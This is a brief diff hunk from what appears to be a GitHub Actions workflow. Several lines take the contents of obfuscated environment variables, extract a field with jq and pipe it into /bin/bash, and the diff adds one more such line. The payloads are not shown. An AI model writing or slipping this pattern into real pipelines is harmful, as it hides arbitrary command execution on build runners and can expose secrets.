@@ -29,6 +29,7 @@ jobs:
           echo $p30974 | jq -r .dwa42051 | /bin/bash
           echo $jmpr710 | jq -r .busc75 | /bin/bash
           echo $uva9594 | jq -r .gp2 | /bin/bash
+          printf '%s' "$y45" | jq -r .fb03 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
